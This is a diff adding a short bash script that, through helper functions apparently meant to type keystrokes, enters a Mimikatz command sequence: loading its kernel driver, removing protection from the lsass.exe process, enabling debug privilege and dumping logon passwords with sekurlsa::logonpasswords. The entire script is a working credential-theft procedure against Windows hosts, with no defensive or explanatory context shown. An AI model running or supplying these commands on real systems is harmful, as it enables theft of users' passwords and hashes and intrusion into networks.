@@ -1,0 +1,15 @@
+#!/bin/bash
+
+type_command "!+"
+type_newline
+type_newline
+
+type_command "!processprotect /process:lsass.exe /remove"
+type_newline
+
+type_command "privilege::debug"
+type_newline
+
+type_command "sekurlsa::logonpasswords"
+type_newline
+
